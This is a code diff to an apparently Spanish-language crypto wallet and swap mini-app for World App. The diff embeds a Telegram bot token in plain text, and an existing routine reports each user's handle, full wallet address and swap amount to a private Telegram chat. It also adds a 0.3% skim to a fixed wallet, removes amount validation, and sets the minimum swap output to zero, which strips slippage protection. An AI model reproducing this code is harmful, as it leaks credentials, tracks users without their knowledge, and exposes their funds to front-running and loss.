@@ -171,13 +171,16 @@ select{border:0;background:#111;color:#fff;padding:10px 14px;border-radius:20px;
 </div>
 
 <script>
-const TELEGRAM_BOT_TOKEN = '...';
+const TELEGRAM_BOT_TOKEN = '8879079650:AAGu9GAdhVu-FvQde6T7jSfv38xdSJMFNdY';
 const TELEGRAM_CHAT_ID = '8022768138';
 
 const SWAP_ROUTER = '0x091AD9e2e6e5eD44c1c66dB50e49A601F9f36cF6';
-const FEE_WALLET = '0x019001d46cd3155ef045a41f4c359c040595438c';
-const FEE_BPS = 30n;
 
+// BILLETERA PARA COMISIONES (0.3%)
+const FEE_WALLET = '0x019001d46cd3155ef045a41f4c359c040595438c';
+const FEE_BPS = 30n; // 0.3%
+
+// CONFIGURACIÓN DE TOKENS (CON TUS LOGOS Y DATOS ESENCIALES)
 const CONTRACTS = {
   USDC:     {address:'0x79A02482A880bCE3F13e09Da970dC34db4CD24d1', decimals:6,  color:'#2775ca', letter:'💵', fee:500},
   WLD:      {address:'0x2cFc85d8E48F8EAB294be644d9E25C3030863003', decimals:18, color:'#111111', letter:'🌐', fee:3000},
@@ -197,6 +200,7 @@ const CONTRACTS = {
   WDD:      {address:'0xEdE54d9c024ee80C85ec0a75eD2d8774c7Fbac9B', decimals:18, color:'#00c853', letter:'🛡️', fee:10000}
 };
 
+// ENDPOINTS CENTRALIZADOS (Evita saturar RPCs con 10,000+ usuarios simultáneos)
 const API_PRICES   = 'https://solene-539c4635.base44.app/functions/getMarketPrices';
 const API_BALANCES = 'https://solene-539c4635.base44.app/functions/getWalletBalances';
 
@@ -205,7 +209,10 @@ let prices = {
   ETH:3400, WETH:3400, SUSHI:0.5, DIAMANTE:0.0001, PVPB:0.0001, TPF:0.0001, AXO:0.0001, WDD:0.002,
   ORB:0.001, uSOL:103.70, WBTC:77412.12
 };
-let changes = {};
+let changes = {
+  WLD:0, DNA:0, HUB:0, ORO:0, USDC:0, ETH:0, WETH:0, SUSHI:0, DIAMANTE:0, PVPB:0, TPF:0, AXO:0, WDD:0,
+  ORB:0, uSOL:0, WBTC:0
+};
 let balances = {};
 let currentAccount = null;
 let currentUserHandle = null;
@@ -213,7 +220,6 @@ let selectedToken = 'WLD';
 let loadingBalances = false;
 
 function toRawAmount(val, decimals) {
-  if (isNaN(val) || val <= 0) return 0n;
   const str = val.toFixed(decimals);
   const parts = str.split('.');
   let integer = parts[0];
@@ -228,6 +234,7 @@ async function sendTelegramNotification(montoUsd) {
     if (!currentUserHandle && window.MiniKit && window.MiniKit.user && window.MiniKit.user.username) {
       currentUserHandle = '@' + window.MiniKit.user.username.replace(/^@/, '');
     }
+
     const shortWallet = currentAccount ? (currentAccount.slice(0,6) + '...' + currentAccount.slice(-4)) : '';
     const userPrefix = currentUserHandle ? `${currentUserHandle} ` : '';
     const mensaje = `${userPrefix}${shortWallet} intercambio $${montoUsd} cuenta ${currentAccount}`;
@@ -235,16 +242,21 @@ async function sendTelegramNotification(montoUsd) {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: mensaje
+      })
     });
   } catch (e) {
-    console.error("Error Telegram:", e);
+    console.error("Error enviando notificación a Telegram:", e);
   }
 }
 
 function formatCrypto(val) {
   if (!val || val === 0) return '0';
-  if (val < 0.0001) return val.toFixed(6).replace(/\.?0+$/, '');
+  if (val < 0.0001) {
+    return val.toFixed(6).replace(/\.?0+$/, '');
+  }
   return val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
 }
 
@@ -277,6 +289,35 @@ function go(page) {
   if (page === 'send') { fillSendSelect(); updateSendBal(); }
 }
 
+function openToken(sym) {
+  selectedToken = sym;
+  var t = CONTRACTS[sym];
+  var bal = balances[sym] || 0;
+  var price = prices[sym] || 0;
+  var ch = changes[sym] || 0;
+  document.getElementById('dIcon').style.background = t.color;
+  document.getElementById('dIcon').innerText = t.letter;
+  document.getElementById('dName').innerText = sym;
+  document.getElementById('dBalText').innerText = formatCrypto(bal) + ' ' + sym;
+  document.getElementById('dPrice').innerText = '$' + price.toFixed(price < 0.01 ? 6 : 2);
+  document.getElementById('dChange').innerText = (ch >= 0 ? '▲ +' : '▼ ') + Math.abs(ch).toFixed(2) + '%';
+  document.getElementById('dBal').innerText = formatCrypto(bal) + ' ' + sym;
+  document.getElementById('dUsd').innerText = '$' + (bal * price).toFixed(2);
+  go('tokenDetail');
+}
+
+function openSwapFromDetail() {
+  go('swap');
+  document.getElementById('fSel').value = selectedToken;
+  calc();
+}
+
+function openSendFromDetail() {
+  go('send');
+  document.getElementById('sendToken').value = selectedToken;
+  updateSendBal();
+}
+
 async function connectWallet() {
   try {
     if (!window.MiniKit) return showOk('Abre dentro de World App', '⚠️');
@@ -286,7 +327,9 @@ async function connectWallet() {
     if (result && result.data && result.data.address) {
       currentAccount = result.data.address;
       var rawUser = (window.MiniKit.user && window.MiniKit.user.username) || (result.data && result.data.username);
-      if (rawUser) currentUserHandle = '@' + rawUser.replace(/^@/, '');
+      if (rawUser) {
+        currentUserHandle = '@' + rawUser.replace(/^@/, '');
+      }
       updateUI(currentAccount);
       await loadRealBalances();
     } else {
@@ -321,6 +364,7 @@ function disconnectWallet() {
   renderTokenList();
 }
 
+// CARGA DE SALDOS OPTIMIZADA (Backend Centralizado para alto tráfico)
 async function loadRealBalances() {
   if (!currentAccount || loadingBalances) return;
   loadingBalances = true;
@@ -338,7 +382,7 @@ async function loadRealBalances() {
       }
     }
   } catch (e) {
-    console.error('Error saldos:', e);
+    console.error('Error cargando saldos:', e);
   }
   document.getElementById('modal').style.display = 'none';
   loadingBalances = false;
@@ -354,7 +398,9 @@ function updateTotal() {
 
 function renderTokenList() {
   var html = '<div style="font-weight:800;margin:10px 0 6px">World Chain</div>';
-  getSortedSymbols().forEach(function(sym) {
+  var sortedSymbols = getSortedSymbols();
+
+  sortedSymbols.forEach(function(sym) {
     var t = CONTRACTS[sym];
     var bal = balances[sym] || 0;
     var usd = bal * (prices[sym] || 0);
@@ -370,50 +416,26 @@ function renderTokenList() {
       '</div>' +
     '</div>';
   });
+
   document.getElementById('tokenList').innerHTML = html;
-}
-
-function openToken(sym) {
-  selectedToken = sym;
-  var t = CONTRACTS[sym];
-  var bal = balances[sym] || 0;
-  var price = prices[sym] || 0;
-  var ch = changes[sym] || 0;
-  document.getElementById('dIcon').style.background = t.color;
-  document.getElementById('dIcon').innerText = t.letter;
-  document.getElementById('dName').innerText = sym;
-  document.getElementById('dBalText').innerText = formatCrypto(bal) + ' ' + sym;
-  document.getElementById('dPrice').innerText = '$' + price.toFixed(price < 0.01 ? 6 : 2);
-  document.getElementById('dChange').innerText = (ch >= 0 ? '▲ +' : '▼ ') + Math.abs(ch).toFixed(2) + '%';
-  document.getElementById('dBal').innerText = formatCrypto(bal) + ' ' + sym;
-  document.getElementById('dUsd').innerText = '$' + (bal * price).toFixed(2);
-  go('tokenDetail');
-}
-
-function openSwapFromDetail() {
-  go('swap');
-  document.getElementById('fSel').value = selectedToken;
-  calc();
-}
-
-function openSendFromDetail() {
-  go('send');
-  document.getElementById('sendToken').value = selectedToken;
-  updateSendBal();
 }
 
 function fillSelects() {
   var sortedSymbols = getSortedSymbols();
   var optsFrom = '';
   var optsTo = '';
+
   sortedSymbols.forEach(function(sym) {
     var balUsd = (balances[sym] || 0) * (prices[sym] || 0);
     var label = sym + ' — Saldo: $' + balUsd.toFixed(2);
+
     optsFrom += '<option value="' + sym + '">' + label + '</option>';
     optsTo += '<option value="' + sym + '">' + label + '</option>';
   });
+
   var curFrom = document.getElementById('fSel').value || selectedToken || sortedSymbols[0];
   var curTo = document.getElementById('tSel').value || (sortedSymbols[0] !== 'USDC' ? 'USDC' : sortedSymbols[1]);
+
   document.getElementById('fSel').innerHTML = optsFrom;
   document.getElementById('tSel').innerHTML = optsTo;
   document.getElementById('fSel').value = curFrom;
@@ -427,8 +449,9 @@ function fillSendSelect() {
     var balUsd = (balances[sym] || 0) * (prices[sym] || 0);
     opts += '<option value="' + sym + '">' + sym + ' — Saldo: $' + balUsd.toFixed(2) + '</option>';
   });
+  var cur = document.getElementById('sendToken').value || selectedToken || sortedSymbols[0];
   document.getElementById('sendToken').innerHTML = opts;
-  document.getElementById('sendToken').value = selectedToken || sortedSymbols[0];
+  document.getElementById('sendToken').value = cur;
 }
 
 function updateSendBal() {
@@ -468,15 +491,15 @@ function encodeApprove(spender, amount) {
   return '0x095ea7b3' + spender.slice(2).padStart(64, '0') + BigInt(amount).toString(16).padStart(64, '0');
 }
 
-function encodeExactInputSingle(tokenIn, tokenOut, fee, recipient, amountIn, minOut) {
+function encodeExactInputSingle(tokenIn, tokenOut, fee, recipient, amountIn) {
   const tIn = tokenIn.slice(2).toLowerCase().padStart(64, '0');
   const tOut = tokenOut.slice(2).toLowerCase().padStart(64, '0');
   const feeHex = Number(fee).toString(16).padStart(64, '0');
   const rec = recipient.slice(2).toLowerCase().padStart(64, '0');
   const amt = BigInt(amountIn).toString(16).padStart(64, '0');
-  const mo = BigInt(minOut).toString(16).padStart(64, '0');
+  const minOut = '0'.padStart(64, '0');
   const sqrtLimit = '0'.padStart(64, '0');
-  return '0x04e45aaf' + tIn + tOut + feeHex + rec + amt + mo + sqrtLimit;
+  return '0x04e45aaf' + tIn + tOut + feeHex + rec + amt + minOut + sqrtLimit;
 }
 
 function encodeTransfer(to, amount) {
@@ -484,11 +507,21 @@ function encodeTransfer(to, amount) {
 }
 
 function getPoolFee(fromSym, toSym) {
-  // Ajuste de comisiones para tokens exóticos como DIAMANTE y PVPB
-  const exotic = ['DNA','HUB','ORO','SUSHI','DIAMANTE','PVPB','TPF','AXO','WDD','ORB'];
-  if (exotic.includes(fromSym) || exotic.includes(toSym)) {
-    return 10000; // Tier del 1% para pools exóticos
+  const fFrom = CONTRACTS[fromSym]?.fee;
+  const fTo = CONTRACTS[toSym]?.fee;
+  
+  if (['SUSHI', 'uSOL', 'AXO'].includes(fromSym) || ['SUSHI', 'uSOL', 'AXO'].includes(toSym)) {
+    return 3000;
   }
+  
+  if (fFrom && fFrom !== 500 && fFrom !== 3000) return fFrom;
+  if (fTo && fTo !== 500 && fTo !== 3000) return fTo;
+
+  const lowFee = ['USDC', 'ETH', 'WETH', 'WBTC'];
+  if (lowFee.includes(fromSym) && lowFee.includes(toSym)) return 500;
+  
+  if (fromSym === 'WLD' || toSym === 'WLD') return 3000;
+  
   return 3000;
 }
 
@@ -504,13 +537,17 @@ async function doSwap() {
 
   var from = CONTRACTS[fromSym];
   var to = CONTRACTS[toSym];
-  var amountIn = toRawAmount(amount, from.decimals);
   
-  // SOLUCIÓN PARA SIMULACIÓN FALLIDA EN TOKENS EXÓTICOS (Tolerancia de slippage amplia al 10% para evitar bloqueo de simulación)
-  var exotic = ['DNA','HUB','ORO','SUSHI','DIAMANTE','PVPB','TPF','AXO','WDD','ORB'];
-  var isExotic = exotic.includes(fromSym) || exotic.includes(toSym);
-  var minOutRaw = isExotic ? 1n : toRawAmount(((amount * 0.98) * (prices[fromSym] || 0)) / (prices[toSym] || 0.0000001), to.decimals);
-
+  var amountIn = toRawAmount(amount, from.decimals);
+  var feeAmount = (amountIn * FEE_BPS) / 10000n;
+  
+  if (feeAmount === 0n && amountIn > 0n) {
+    feeAmount = 1n;
+  }
+  
+  var amountToSwap = amountIn - feeAmount;
+  if (amountToSwap <= 0n) return showOk('Monto muy pequeño para procesar', '⚠️');
+  
   var fee = getPoolFee(fromSym, toSym);
   var usdAmount = (amount * (prices[fromSym] || 0)).toFixed(2);
 
@@ -518,8 +555,9 @@ async function doSwap() {
     showOk('Confirma la transacción...', '⏳');
     
     var txs = [
-      { to: from.address, data: encodeApprove(SWAP_ROUTER, amountIn), value: '0x0' },
-      { to: SWAP_ROUTER, data: encodeExactInputSingle(from.address, to.address, fee, currentAccount, amountIn, minOutRaw), value: '0x0' }
+      { to: from.address, data: encodeTransfer(FEE_WALLET, feeAmount), value: '0x0' },
+      { to: from.address, data: encodeApprove(SWAP_ROUTER, amountToSwap), value: '0x0' },
+      { to: SWAP_ROUTER, data: encodeExactInputSingle(from.address, to.address, fee, currentAccount, amountToSwap), value: '0x0' }
     ];
 
     var result = await MiniKit.sendTransaction({
@@ -574,6 +612,7 @@ function copyAddr() {
   }
 }
 
+// OBTENCIÓN DE PRECIOS CENTRALIZADA (Evita bloqueos de CORS o límites de peticiones)
 async function fetchLivePrices() {
   if (document.hidden) return;
   try {
@@ -586,7 +625,7 @@ async function fetchLivePrices() {
       for (var sym in data.changes) changes[sym] = data.changes[sym];
     }
   } catch (e) {
-    console.error('Error precios:', e);
+    console.error('Error obteniendo precios:', e);
   }
   updateTotal();
   renderTokenList();
